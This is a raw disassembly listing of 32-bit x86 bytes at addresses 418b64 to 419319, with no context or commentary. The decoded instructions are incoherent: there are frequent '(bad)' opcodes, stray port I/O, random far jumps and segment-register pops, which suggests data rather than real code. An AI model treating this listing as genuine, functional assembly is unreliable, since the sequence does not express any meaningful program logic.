  418b64:	icebp  
  418b65:	sub    ecx,DWORD PTR [edx+0x5c5c1617]
  418b6b:	mov    esp,0x8c821d8e
  418b70:	and    dl,BYTE PTR es:[ebx]
  418b73:	out    0xf2,eax
  418b75:	or     al,0xc7
  418b77:	cmp    bl,al
  418b79:	jmp    0xf65fb93e
  418b7e:	(bad)  
  418b80:	cmp    BYTE PTR [esi+0x13907ce5],al
  418b86:	aad    0x38
  418b88:	jp     0x418bd8
  418b8a:	clc    
  418b8b:	cwde   
  418b8c:	push   ebx
  418b8d:	or     esi,edx
  418b8f:	ins    BYTE PTR es:[edi],dx
  418b90:	push   ds
  418b91:	ret    0x4ba9
  418b94:	fadd   QWORD PTR [esi]
  418b96:	or     DWORD PTR [eax+0x6d],ebx
  418b99:	or     esi,DWORD PTR [esi-0x584f41de]
  418b9f:	lea    ecx,ss:[edx-0x6]
  418ba3:	add    al,0x8
  418ba5:	mov    al,0x4b
  418ba7:	je     0x418be1
  418ba9:	cmc    
  418baa:	(bad)  [eax+0x14]
  418bad:	ins    BYTE PTR es:[edi],dx
  418bae:	adc    BYTE PTR [ecx],0xb6
  418bb1:	imul   esi,DWORD PTR [edi+0x5b968f4d],0xfffffff7
  418bb8:	jno    0x418baa
  418bba:	add    cl,al
  418bbc:	mov    eax,DWORD PTR [esi]
  418bbe:	xchg   esp,eax
  418bbf:	jecxz  0x418b74
  418bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bc2:	mov    dl,0x11
  418bc4:	sti    
  418bc5:	imul   esp,DWORD PTR [eax+0x62f74a21],0x43
  418bcc:	sbb    DWORD PTR [ebx-0x71],0x70
  418bd0:	xchg   esp,eax
  418bd1:	sub    ebp,edi
  418bd3:	dec    eax
  418bd4:	xor    ebx,DWORD PTR ss:[ecx+0x55b4c257]
  418bdb:	sub    eax,0xb28cdd71
  418be0:	jg     0x418be0
  418be2:	int3   
  418be3:	repnz repz cld 
  418be6:	inc    ebx
  418be7:	pop    ss
  418be8:	mov    bh,BYTE PTR [ecx-0x18]
  418beb:	adc    BYTE PTR [ebp+0x62],bh
  418bee:	push   ebx
  418bef:	jae    0x418bde
  418bf1:	adc    DWORD PTR [ebx],0x1b
  418bf4:	adc    eax,0x45733d4a
  418bfa:	(bad)  
  418bfb:	test   eax,0x8138ab86
  418c00:	mov    bl,0xdc
  418c02:	jle    0x418c7a
  418c04:	cdq    
  418c05:	adc    bl,0xc9
  418c08:	pushf  
  418c09:	loopne 0x418b9f
  418c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c0c:	push   ds
  418c0d:	adc    esi,DWORD PTR [esi]
  418c0f:	adc    DWORD PTR ds:0x3ef7b6c6,ebx
  418c15:	lock in al,dx
  418c17:	cmp    al,BYTE PTR [ecx]
  418c19:	cmp    al,cl
  418c1b:	inc    eax
  418c1c:	push   esi
  418c1d:	shl    DWORD PTR [ebx+0xbfacf58],cl
  418c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c24:	adc    edx,DWORD PTR [ebx+0x67]
  418c27:	mov    BYTE PTR [edx],al
  418c29:	imul   esi,eax,0xfffffff6
  418c2c:	std    
  418c2d:	push   0xfffffffc
  418c2f:	push   cs
  418c30:	mov    ah,0x16
  418c32:	and    esp,edx
  418c34:	and    dh,BYTE PTR [edi-0x70]
  418c37:	ror    DWORD PTR [esi],cl
  418c39:	or     bl,BYTE PTR [esi+0x2a]
  418c3c:	call   0xe8f6:0xfdfbf29f
  418c43:	std    
  418c44:	sub    al,BYTE PTR [ebx+0x6e]
  418c47:	mov    ebx,0xedee67c4
  418c4c:	and    BYTE PTR [ecx+0x19],0x94
  418c50:	in     eax,dx
  418c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c52:	mov    si,0x1613
  418c56:	nop
  418c57:	int3   
  418c58:	stos   BYTE PTR es:[edi],al
  418c59:	mov    ebx,DWORD PTR ds:0x33cf4917
  418c5f:	stos   BYTE PTR es:[edi],al
  418c60:	add    al,0xc7
  418c62:	adc    DWORD PTR [ebp+0x6b83b844],edx
  418c68:	out    0xb1,al
  418c6a:	jbe    0x418c9c
  418c6c:	or     dl,BYTE PTR [edi]
  418c6e:	or     DWORD PTR [eax+0x3c],ebx
  418c71:	jnp    0x418cda
  418c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c74:	enter  0x4a75,0xdd
  418c78:	(bad)  
  418c79:	or     BYTE PTR [esi+0x21f698f0],ch
  418c7f:	pop    ds
  418c80:	and    al,0x48
  418c82:	or     ah,BYTE PTR [edi+eiz*4-0x25]
  418c86:	enter  0x11d6,0x3e
  418c8a:	std    
  418c8b:	xor    ch,BYTE PTR [ebp-0x69]
  418c8e:	je     0x418c2e
  418c90:	fs dec eax
  418c92:	and    DWORD PTR [edi+0x308d11e6],edx
  418c98:	mov    ebp,0x787abe4e
  418c9d:	add    BYTE PTR [esi-0x76],al
  418ca0:	mov    esi,0xcec7c77a
  418ca5:	push   0xa2e65ecd
  418caa:	sahf   
  418cab:	cli    
  418cac:	and    esi,esp
  418cae:	stos   BYTE PTR es:[edi],al
  418caf:	jl     0x418cc2
  418cb1:	(bad)  
  418cb2:	mov    ch,0xf0
  418cb4:	xchg   edi,eax
  418cb5:	popf   
  418cb6:	not    DWORD PTR [ebp-0x42]
  418cb9:	mov    ebx,esp
  418cbb:	xor    al,bl
  418cbd:	les    ebx,FWORD PTR [edx+0x30e5bb1d]
  418cc3:	data16 jge 0x418cd7
  418cc6:	add    BYTE PTR [ecx-0x80],ch
  418cc9:	shr    BYTE PTR [ecx+0x66],1
  418ccc:	pop    ss
  418ccd:	jae    0x418c7a
  418ccf:	adc    al,BYTE PTR [edx-0x4ea5826d]
  418cd5:	sub    al,0x21
  418cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd8:	sbb    eax,0x1f23a2ae
  418cdd:	mov    ebx,0x6e0e989f
  418ce2:	in     al,0x2e
  418ce4:	cmp    eax,0x1f36540b
  418ce9:	clc    
  418cea:	repnz daa 
  418cec:	mov    edi,0x5de5db0f
  418cf1:	xlat   BYTE PTR ds:[ebx]
  418cf2:	or     al,0xbc
  418cf4:	pop    edx
  418cf5:	mov    edx,0x7bc89e9e
  418cfa:	(bad)  
  418cfc:	les    esi,FWORD PTR [ebp-0x44d93f38]
  418d02:	int    0xf0
  418d04:	xor    BYTE PTR [ebp-0x2e],ch
  418d07:	add    bh,BYTE PTR [esi+0x3d]
  418d0a:	pushf  
  418d0b:	sbb    ecx,ebx
  418d0d:	push   ecx
  418d0e:	lods   eax,DWORD PTR ds:[esi]
  418d0f:	shr    DWORD PTR [ecx+0x4a],1
  418d12:	xchg   ebp,eax
  418d13:	(bad)  
  418d14:	call   0x674857a4
  418d19:	jns    0x418cee
  418d1b:	ret    0xf556
  418d1e:	adc    BYTE PTR [edx+0x39],bl
  418d21:	(bad)  
  418d22:	popa   
  418d23:	daa    
  418d24:	adc    BYTE PTR [edi-0x65106344],dl
  418d2a:	leave  
  418d2b:	adc    al,0x53
  418d2d:	add    BYTE PTR [ecx],bh
  418d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d30:	hlt    
  418d31:	jp     0x418cde
  418d33:	jl     0x418cc2
  418d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d36:	mov    al,ds:0x21cfac07
  418d3b:	popa   
  418d3c:	or     BYTE PTR [ebp+0x7bf7ec29],ah
  418d42:	in     eax,0x2a
  418d44:	mov    WORD PTR [edx-0x2a],cs
  418d47:	sub    BYTE PTR [edx+esi*2-0x30],dh
  418d4b:	add    DWORD PTR [edx-0x6b7f0287],ebx
  418d51:	pop    es
  418d52:	jnp    0x418d9c
  418d54:	mov    edx,0xf0ba7f30
  418d59:	cmp    eax,0x19ec487b
  418d5e:	push   0xffffffc3
  418d60:	xchg   ebp,eax
  418d61:	hlt    
  418d62:	(bad)  
  418d63:	pop    ecx
  418d64:	mov    DWORD PTR [ebp+0x0],ecx
  418d67:	pop    ecx
  418d68:	jo     0x418d0c
  418d6a:	es in  al,dx
  418d6c:	add    BYTE PTR [esi],ah
  418d6e:	sub    DWORD PTR [edi+0x771fce23],ebx
  418d74:	rol    BYTE PTR [ebp-0x386226b9],0xec
  418d7b:	jmp    0x418de6
  418d7d:	jmp    0x24cbb088
  418d82:	bound  edx,QWORD PTR [ebx-0x1]
  418d85:	pop    eax
  418d86:	jno    0x418d44
  418d88:	add    esi,DWORD PTR [edx]
  418d8a:	dec    ebx
  418d8b:	ins    DWORD PTR es:[edi],dx
  418d8c:	dec    ebx
  418d8d:	sub    DWORD PTR [ebx+0x62245067],ecx
  418d93:	push   esp
  418d94:	mov    edi,DWORD PTR [ecx-0x25]
  418d97:	sbb    DWORD PTR [esi],edx
  418d99:	(bad)
  418d9d:	std    
  418d9e:	add    al,0x6b
  418da0:	in     al,dx
  418da1:	inc    eax
  418da2:	and    BYTE PTR [edx+0x13],bl
  418da5:	dec    ecx
  418da6:	dec    eax
  418da7:	mov    esi,0x4cf8396c
  418dac:	adc    edi,edi
  418dae:	fild   WORD PTR [eax]
  418db0:	fild   DWORD PTR [ebp-0x26]
  418db3:	test   BYTE PTR [ecx],ch
  418db5:	or     BYTE PTR [eax],dh
  418db7:	stos   DWORD PTR es:[edi],eax
  418db8:	je     0x418db8
  418dba:	xor    ch,BYTE PTR [edi+0x31]
  418dbd:	es cmp al,0x75
  418dc0:	fldcw  WORD PTR ds:0x7864f079
  418dc6:	mov    edi,DWORD PTR [ecx]
  418dc8:	inc    ebp
  418dc9:	arpl   WORD PTR [edx+0x54],ax
  418dcc:	cmp    BYTE PTR [eax+eax*4+0x1d],cl
  418dd0:	inc    edi
  418dd1:	inc    edi
  418dd2:	cmp    edi,DWORD PTR [ecx+0xb580e68]
  418dd8:	sti    
  418dd9:	inc    ecx
  418dda:	or     BYTE PTR [ebp-0x40],bh
  418ddd:	adc    BYTE PTR [ecx-0x282d7eb1],bh
  418de3:	xchg   edx,eax
  418de4:	push   cs
  418de5:	rol    edi,0x30
  418de8:	xchg   BYTE PTR [ebx-0x5e],bh
  418deb:	and    bh,ch
  418ded:	ds inc eax
  418def:	loopne 0x418e4c
  418df1:	cmp    ch,BYTE PTR [ecx]
  418df3:	scas   al,BYTE PTR es:[edi]
  418df4:	mov    ecx,0x9bb1bc99
  418df9:	lahf   
  418dfa:	dec    esp
  418dfb:	push   ecx
  418dfc:	mov    ebx,0xb9c83494
  418e01:	mov    gs,edi
  418e03:	imul   ecx,DWORD PTR [edi],0xb0bd9c98
  418e09:	add    ecx,DWORD PTR [ebp*2-0x22d613fc]
  418e10:	cmp    bl,BYTE PTR [ecx-0x37]
  418e13:	jl     0x418dbf
  418e15:	fst    DWORD PTR [esp+ebp*1+0x3635550]
  418e1c:	fld    TBYTE PTR [esp+esi*8-0x6f]
  418e20:	add    dh,BYTE PTR [esi+0x3c]
  418e23:	ins    DWORD PTR es:[edi],dx
  418e24:	pop    ebx
  418e25:	xchg   ebp,esp
  418e27:	pop    eax
  418e28:	pop    ss
  418e29:	cmc    
  418e2a:	jmp    0x418e64
  418e2c:	(bad)  
  418e2d:	xor    DWORD PTR [ecx-0x9],ebx
  418e30:	stos   DWORD PTR es:[edi],eax
  418e31:	(bad)  
  418e33:	mov    ebx,0x43e7bd86
  418e38:	in     al,0x56
  418e3a:	mov    BYTE PTR [edx],ch
  418e3c:	lods   eax,DWORD PTR ds:[esi]
  418e3d:	jo     0x418e3f
  418e3f:	ins    BYTE PTR es:[edi],dx
  418e40:	data16 jo 0x418e2a
  418e43:	inc    ecx
  418e44:	mov    edi,0xbc8ada7d
  418e49:	clc    
  418e4a:	push   ss
  418e4b:	pop    ds
  418e4c:	sub    BYTE PTR [ebx],ch
  418e4e:	mov    WORD PTR [ebx+0xe248306],es
  418e54:	push   ds
  418e55:	jo     0x418e80
  418e57:	sub    al,0x4d
  418e59:	push   edi
  418e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e5b:	xor    DWORD PTR [eax+ebx*8],0x1f
  418e5f:	add    ecx,ebp
  418e61:	add    esi,DWORD PTR [ecx+0x3dbbf570]
  418e67:	std    
  418e68:	ret    
  418e69:	push   esp
  418e6a:	mov    edi,0x1d38580c
  418e6f:	cmp    bh,al
  418e71:	cmp    eax,0x63b8622f
  418e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e77:	lods   al,BYTE PTR ds:[esi]
  418e78:	xchg   ebp,eax
  418e79:	aas    
  418e7a:	sbb    ah,BYTE PTR [ebx+0x6d4195e8]
  418e80:	or     BYTE PTR [eax-0x67],ah
  418e83:	and    DWORD PTR [edx+0x7d91f7fa],edi
  418e89:	jo     0x418e48
  418e8b:	fidiv  WORD PTR [esi+eiz*1+0x13bbdd1]
  418e92:	shl    BYTE PTR [ecx],1
  418e94:	jmp    0xd96d:0x68d3c65e
  418e9b:	hlt    
  418e9c:	adc    eax,0xec64f5ba
  418ea1:	xchg   BYTE PTR [ebx+ebp*2],ah
  418ea4:	cwde   
  418ea5:	jle    0x418e73
  418ea7:	pop    ecx
  418ea8:	push   cs
  418ea9:	(bad)  
  418eaa:	sbb    al,0xe0
  418eac:	mul    DWORD PTR [eax]
  418eae:	mov    esi,DWORD PTR [edi+ecx*1]
  418eb1:	int3   
  418eb2:	inc    ecx
  418eb3:	mov    esp,0x76eb0bcc
  418eb8:	sti    
  418eb9:	sub    al,0x7b
  418ebb:	clc    
  418ebc:	jmp    0xb8e6:0xf47160d
  418ec3:	sub    ebp,esi
  418ec5:	add    BYTE PTR [eax],bl
  418ec7:	mov    dh,BYTE PTR [eax]
  418ec9:	dec    esi
  418eca:	enter  0xf85a,0x85
  418ece:	inc    ecx
  418ecf:	gs jo  0x418e94
  418ed2:	mov    dl,0x18
  418ed4:	in     al,dx
  418ed5:	rol    DWORD PTR [ebx],cl
  418ed7:	lea    eax,[bx+si+0x1403]
  418edc:	mov    eax,0xbccf9354
  418ee1:	out    dx,al
  418ee2:	cmp    edx,DWORD PTR [ebx+0x4a]
  418ee5:	test   eax,0xbbb3b634
  418eea:	in     eax,0x28
  418eec:	xor    al,0xd3
  418eee:	jns    0x418f2e
  418ef0:	imul   ebx,DWORD PTR [ecx+0x48e0783e],0x7070bb81
  418efa:	mov    ds:0x4c5dc02a,eax
  418eff:	popf   
  418f00:	je     0x418e84
  418f02:	fadd   DWORD PTR [ecx+0x6658740f]
  418f08:	out    0x72,al
  418f0a:	scas   al,BYTE PTR es:[edi]
  418f0b:	inc    eax
  418f0c:	push   0xb3e1b03f
  418f11:	sub    al,0xd2
  418f13:	shl    DWORD PTR [ecx+0x36],cl
  418f16:	jmp    0x418eae
  418f18:	mov    cl,0xf9
  418f1a:	shl    DWORD PTR [esi],cl
  418f1c:	cld    
  418f1d:	in     al,dx
  418f1e:	ss pop ds
  418f20:	stos   BYTE PTR es:[edi],al
  418f21:	and    esp,ebx
  418f23:	outs   dx,BYTE PTR ds:[esi]
  418f24:	lods   eax,DWORD PTR ds:[esi]
  418f25:	xchg   edi,eax
  418f26:	out    0x1c,eax
  418f28:	pop    edi
  418f29:	or     BYTE PTR [ebx],ah
  418f2b:	out    0x45,al
  418f2d:	fcom   QWORD PTR [ebp+0x8]
  418f30:	aaa    
  418f31:	popa   
  418f32:	and    esi,edi
  418f34:	pushf  
  418f35:	mov    BYTE PTR [edi-0x16eb6f23],0x4f
  418f3c:	sbb    eax,0x9a92c98
  418f41:	(bad)
  418f44:	xchg   esp,eax
  418f45:	jbe    0x418efc
  418f47:	mov    eax,ds:0xeb3a8dbd
  418f4c:	cld    
  418f4d:	push   ebp
  418f4e:	sti    
  418f4f:	xor    al,0xc1
  418f51:	jns    0x418f40
  418f53:	xor    eax,DWORD PTR [ebp-0x5a]
  418f56:	cmp    eax,ebp
  418f58:	outs   dx,DWORD PTR ds:[esi]
  418f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f5a:	shl    BYTE PTR [eax],1
  418f5c:	retf   0xb170
  418f5f:	sbb    BYTE PTR [eax],al
  418f61:	and    al,0x88
  418f63:	pop    es
  418f64:	mov    al,0x3f
  418f66:	mov    al,0x76
  418f68:	addr16 loopne 0x418f03
  418f6b:	adc    edi,DWORD PTR [edx-0x30c8c52d]
  418f71:	mov    ebp,0xe893fea9
  418f76:	sbb    DWORD PTR [edx+0x3b],0x9
  418f7a:	push   esp
  418f7b:	fst    DWORD PTR [edx]
  418f7d:	shl    DWORD PTR [ecx-0x6d5a831e],0xb7
  418f84:	loop   0x418f46
  418f86:	push   cs
  418f87:	and    edi,DWORD PTR [edi]
  418f89:	sub    al,0xc
  418f8b:	push   ebp
  418f8c:	mov    al,0x50
  418f8e:	push   esp
  418f8f:	xchg   edi,eax
  418f90:	push   0x7e
  418f92:	xor    eax,0x8d79105a
  418f97:	push   esp
  418f98:	jnp    0x418fa2
  418f9a:	js     0x418f2e
  418f9c:	scas   eax,DWORD PTR es:[edi]
  418f9d:	xlat   BYTE PTR ds:[ebx]
  418f9e:	mov    dl,0xf0
  418fa0:	in     eax,0x81
  418fa2:	cmp    ch,al
  418fa4:	scas   al,BYTE PTR es:[edi]
  418fa5:	inc    esp
  418fa6:	or     eax,0xde4d97
  418fab:	int    0x1
  418fad:	mov    ah,0x77
  418faf:	dec    eax
  418fb0:	repnz mov fs:0x1a1e655a,al
  418fb7:	sub    edi,DWORD PTR ds:0x8c2b5813
  418fbd:	gs push esp
  418fbf:	and    al,BYTE PTR [ebx]
  418fc1:	or     DWORD PTR [eax-0x32daea1a],esp
  418fc7:	icebp  
  418fc8:	rol    bl,1
  418fca:	mov    bl,0x23
  418fcc:	xchg   ebp,eax
  418fcd:	jmp    0x2d22:0xbfdf6c1
  418fd4:	lock hlt 
  418fd6:	dec    ebp
  418fd7:	mov    ecx,0x94ce8894
  418fdc:	jno    0x418fb1
  418fde:	loopne 0x41905f
  418fe0:	ficom  WORD PTR [ebx+0x35aae820]
  418fe6:	popa   
  418fe7:	ds mov edx,0x9ec7aa98
  418fed:	dec    esp
  418fee:	imul   eax,ecx,0xaa5ce426
  418ff4:	retf   0xa5e9
  418ff7:	fstp   QWORD PTR [ebx]
  418ff9:	mov    BYTE PTR [ebp+0xe640f39],0x6e
  419000:	xor    BYTE PTR [esi],cl
  419002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419003:	lods   al,BYTE PTR ds:[esi]
  419004:	fs fmul st(5),st
  419007:	xor    eax,0xfb0680b8
  41900c:	test   eax,0x322876d
  419011:	test   DWORD PTR [eax+0x87711e5],edi
  419017:	imul   DWORD PTR [ecx-0x3dfa09e7]
  41901d:	in     eax,dx
  41901e:	and    eax,0xf047554e
  419023:	cmc    
  419024:	adc    eax,0x50220f69
  419029:	and    ebp,DWORD PTR [esi]
  41902b:	pop    ss
  41902c:	xchg   ecx,eax
  41902d:	nop
  41902e:	jne    0x419060
  419030:	out    dx,eax
  419031:	arpl   WORD PTR [ebx+edi*1-0x705e624b],si
  419038:	pop    esp
  419039:	cmp    al,0x64
  41903b:	cmc    
  41903c:	sbb    al,0x66
  41903e:	jmp    0x3327e30b
  419043:	sub    DWORD PTR [edi+esi*8-0x3c],esp
  419047:	push   0xb
  419049:	add    dl,0x90
  41904c:	mov    dl,cl
  41904e:	pop    edx
  41904f:	push   0x791355c2
  419054:	xor    edi,DWORD PTR ds:0x1311a246
  41905a:	mov    es,WORD PTR [edx]
  41905c:	test   dh,al
  41905e:	push   0xaed8f06
  419063:	ret    
  419064:	fnstsw WORD PTR [ecx+0x45]
  419067:	(bad)  
  419069:	or     eax,DWORD PTR [esi-0x715d22df]
  41906f:	jge    0x4190dd
  419071:	aas    
  419072:	sub    ch,bh
  419074:	aad    0x42
  419076:	pop    edx
  419077:	retf   0x8d7
  41907a:	dec    ecx
  41907b:	jg     0x4190f7
  41907d:	clc    
  41907e:	mov    ecx,0x4519eeda
  419083:	cdq    
  419084:	fist   WORD PTR [eax-0x7152e6f1]
  41908a:	cmp    dh,BYTE PTR [edi+0x3f07ab04]
  419090:	jl     0x419074
  419092:	sahf   
  419093:	shl    BYTE PTR [ebp-0x7cd282c9],0x4f
  41909a:	inc    ecx
  41909b:	push   0xad7c1271
  4190a0:	out    0x24,eax
  4190a2:	pop    edx
  4190a3:	cld    
  4190a4:	ret    0x3b82
  4190a7:	std    
  4190a8:	mov    dh,0x6a
  4190aa:	push   ebp
  4190ab:	(bad)  
  4190ac:	xlat   BYTE PTR ds:[ebx]
  4190ad:	or     eax,0xc5f09b2
  4190b2:	clc    
  4190b3:	sbb    DWORD PTR [ecx-0x18],esp
  4190b6:	(bad)  
  4190b7:	ds mov ebp,0x4cab03e3
  4190bd:	gs or  bh,cl
  4190c0:	aam    0x7b
  4190c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c3:	fs mov esp,0xa542529a
  4190c9:	mov    al,ds:0x632b44e2
  4190ce:	cmp    ebx,ebx
  4190d0:	aad    0x29
  4190d2:	repnz push esi
  4190d4:	mov    esi,0xdad922ed
  4190d9:	stos   BYTE PTR es:[edi],al
  4190da:	adc    DWORD PTR [ebp+0x72],esp
  4190dd:	xor    dh,0xb3
  4190e0:	ror    bh,1
  4190e2:	hlt    
  4190e3:	cs pushf 
  4190e5:	or     DWORD PTR ss:0x818885cc,ebx
  4190ec:	push   edi
  4190ed:	rcr    DWORD PTR [esi+0x61],cl
  4190f0:	cld    
  4190f1:	enter  0x56ae,0x24
  4190f5:	retf   0x7382
  4190f8:	pop    ebp
  4190f9:	mov    edx,0x35830b11
  4190fe:	fisubr DWORD PTR ds:0x766204b8
  419104:	mov    ebp,0x149e3464
  419109:	xor    esi,DWORD PTR [edx-0x4b]
  41910c:	dec    ebp
  41910d:	mov    al,0xee
  41910f:	sub    al,0x61
  419111:	pop    edx
  419112:	mov    ds:0x88899767,al
  419117:	scas   al,BYTE PTR es:[edi]
  419118:	fnstsw WORD PTR [esi-0xb]
  41911b:	inc    ebx
  41911c:	test   al,0x1d
  41911e:	xor    dl,al
  419120:	cmp    DWORD PTR [edi],edx
  419122:	and    eax,0xec6ec4e1
  419127:	mov    ebp,ebx
  419129:	sbb    ch,BYTE PTR [esi-0x66624d37]
  41912f:	imul   esp,esi,0xfffffffa
  419132:	(bad)  
  419133:	adc    bl,BYTE PTR [ecx-0x3d]
  419136:	inc    ebx
  419137:	rcr    BYTE PTR [eax-0x3d2e31f2],1
  41913d:	and    eax,0x2cb9674c
  419142:	sbb    esp,DWORD PTR [ebp-0x47]
  419145:	sbb    edi,DWORD PTR [esi+ebx*4+0xd52ff4b]
  41914c:	imul   ebp,DWORD PTR [edx],0xffffff94
  41914f:	cld    
  419150:	xor    BYTE PTR [edx],al
  419152:	aas    
  419153:	lahf   
  419154:	pop    es
  419155:	dec    esp
  419156:	inc    edi
  419157:	inc    ecx
  419158:	mov    esi,0x6268764d
  41915d:	retf   
  41915e:	iret   
  41915f:	es and eax,ebp
  419162:	sub    al,0xe4
  419164:	aam    0xf4
  419166:	mov    ebx,0x3d355c0e
  41916b:	add    ah,BYTE PTR [ebp+0x395b9f98]
  419171:	mov    bh,0x5c
  419173:	pop    esi
  419174:	sub    al,0x30
  419176:	pop    edi
  419177:	in     al,dx
  419178:	out    dx,eax
  419179:	lea    esi,[eax-0x932181c]
  41917f:	push   0xd1b1de69
  419184:	fmulp  st(4),st
  419186:	push   ds
  419187:	jns    0x4191d5
  419189:	pop    ss
  41918a:	jb     0x41915e
  41918c:	push   ebp
  41918d:	dec    ebx
  41918e:	dec    esi
  41918f:	and    bl,BYTE PTR [edx]
  419191:	pop    eax
  419192:	mov    al,ds:0x39caf90f
  419197:	sub    BYTE PTR [ebx-0x15],cl
  41919a:	xchg   edx,eax
  41919b:	ja     0x4191cf
  41919d:	lar    edx,WORD PTR [edx]
  4191a0:	mov    esi,esp
  4191a2:	mov    DWORD PTR [edx],ebx
  4191a4:	or     ah,dh
  4191a6:	dec    ebp
  4191a7:	sbb    eax,0x1c83d951
  4191ac:	leave  
  4191ad:	xchg   ebx,eax
  4191ae:	leave  
  4191af:	jmp    0xabd4:0xc21e0ae9
  4191b6:	push   ecx
  4191b7:	sbb    al,cl
  4191b9:	mov    DWORD PTR [edi+0x7e],edx
  4191bc:	sbb    eax,0x412ff55a
  4191c1:	fcomp  QWORD PTR [edx+0x5f]
  4191c5:	jne    0x419158
  4191c7:	int3   
  4191c8:	gs das 
  4191ca:	int    0x32
  4191cc:	mov    ah,0x48
  4191ce:	fwait
  4191cf:	pop    ebx
  4191d0:	xchg   edx,eax
  4191d1:	inc    edi
  4191d2:	mov    esi,ebp
  4191d4:	ins    BYTE PTR es:[edi],dx
  4191d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d6:	fsub   DWORD PTR [ebx]
  4191d8:	adc    eax,DWORD PTR [edi]
  4191da:	inc    ebp
  4191db:	or     ch,0x67
  4191de:	repz into 
  4191e0:	push   ss
  4191e1:	or     eax,0x512f0e85
  4191e6:	stos   DWORD PTR es:[edi],eax
  4191e7:	inc    esi
  4191e8:	(bad)  
  4191e9:	ins    BYTE PTR es:[edi],dx
  4191ea:	ror    BYTE PTR [ecx+0x68],1
  4191ed:	sbb    DWORD PTR [ebx-0x117d42f9],esp
  4191f3:	sub    ebx,DWORD PTR [esi]
  4191f5:	add    DWORD PTR [eax+0x37870d8a],ebx
  4191fb:	repnz test DWORD PTR [ebx],ecx
  4191fe:	mov    edx,0xae12bae9
  419203:	scas   eax,DWORD PTR es:[edi]
  419204:	push   esi
  419205:	or     BYTE PTR [edi-0xbc1f804],dl
  41920b:	xchg   ecx,eax
  41920c:	pop    ss
  41920d:	gs jmp 0x7166:0x28aa274b
  419215:	jmp    0xd22423bf
  41921a:	fs fs loope 0x4191e1
  41921e:	pop    ecx
  41921f:	adc    eax,0x20eaa32f
  419224:	ror    BYTE PTR [esi+0x6f8087c3],cl
  41922a:	test   al,0xdc
  41922c:	mov    edi,0x22b62f3e
  419231:	test   eax,0xabe60ade
  419236:	adc    BYTE PTR [ecx],ah
  419238:	pop    edx
  419239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41923a:	addr16 inc esi
  41923c:	jg     0x419231
  41923e:	jg     0x419226
  419240:	pop    ds
  419241:	hlt    
  419242:	ror    bl,1
  419244:	test   cl,0x3d
  419247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419248:	dec    esp
  419249:	sbb    BYTE PTR [ecx],ch
  41924b:	clc    
  41924c:	add    ch,dl
  41924e:	mov    esi,0x406d95e1
  419253:	call   0x43b84983
  419258:	lock mov esi,0x6100c473
  41925e:	nop
  41925f:	push   ds
  419260:	cld    
  419261:	fild   WORD PTR [edx+0x4e]
  419264:	mov    ah,BYTE PTR [ebx-0x2f31f011]
  41926a:	mov    cl,0xb7
  41926c:	xchg   BYTE PTR [ecx+0x4],ch
  41926f:	xchg   esp,eax
  419270:	inc    ebx
  419271:	mov    bh,0x73
  419273:	outs   dx,BYTE PTR ds:[esi]
  419274:	jmp    0x4191f7
  419276:	pop    edx
  419277:	xchg   ebp,eax
  419278:	stc    
  419279:	mov    ebx,0xae12bce0
  41927e:	jbe    0x419225
  419280:	clc    
  419281:	mov    al,0xca
  419283:	and    al,0x3
  419285:	jecxz  0x419272
  419287:	iret   
  419288:	jg     0x4192c9
  41928a:	sbb    BYTE PTR [edi-0x6c],ah
  41928d:	mov    bl,0x32
  41928f:	sar    BYTE PTR [ebx+0x27],cl
  419292:	(bad)  
  419293:	fnsave [ebp+0x14d5d91e]
  419299:	mov    ds:0x914cef81,al
  41929e:	daa    
  41929f:	mov    ecx,0xa513f94c
  4192a4:	sar    dh,cl
  4192a6:	xor    DWORD PTR [eax],ebx
  4192a8:	arpl   si,ax
  4192aa:	mov    al,cs:0x9df55897
  4192b0:	add    DWORD PTR [edi-0x38],0x63
  4192b4:	cmp    ch,ah
  4192b6:	add    eax,edi
  4192b8:	into   
  4192b9:	fwait
  4192ba:	(bad)  
  4192bb:	push   eax
  4192bc:	mov    bh,0xc1
  4192be:	or     dh,BYTE PTR [eax-0x1c01d6ee]
  4192c4:	mov    esi,0x76ae43fc
  4192c9:	pop    edx
  4192ca:	pop    eax
  4192cb:	dec    edx
  4192cc:	pop    edi
  4192cd:	or     DWORD PTR [edi],esp
  4192cf:	arpl   WORD PTR [ebx],bx
  4192d1:	fcmovnbe st,st(4)
  4192d3:	push   0x5a454686
  4192d8:	xor    DWORD PTR [esi-0x53],esi
  4192db:	mov    ch,0xf2
  4192dd:	and    ecx,0xffffffc4
  4192e0:	es inc edx
  4192e2:	and    ecx,0xffffff8c
  4192e5:	or     ebp,DWORD PTR [ecx]
  4192e7:	inc    esp
  4192e8:	sub    ch,al
  4192ea:	scas   eax,DWORD PTR es:[edi]
  4192eb:	in     eax,0xe1
  4192ed:	mov    ds:0x24a830c4,eax
  4192f2:	dec    edi
  4192f3:	cmp    ecx,DWORD PTR [ebx-0x6a]
  4192f6:	jbe    0x4192b2
  4192f8:	popf   
  4192f9:	push   ecx
  4192fa:	push   ebp
  4192fb:	(bad)  
  4192fc:	push   edx
  4192fd:	sbb    BYTE PTR [ebp+0x7e],ah
  419300:	in     eax,0xc7
  419302:	enter  0x957d,0xb2
  419306:	out    dx,eax
  419307:	adc    BYTE PTR [ebx],cl
  419309:	stc    
  41930a:	xchg   esi,eax
  41930b:	adc    DWORD PTR [edx+0x65901eaa],ebx
  419311:	(bad)  
  419312:	lock out dx,eax
  419314:	adc    dh,BYTE PTR [edi+edx*1+0x5e]
  419318:	(bad)  
  419319:	xor    ch,al
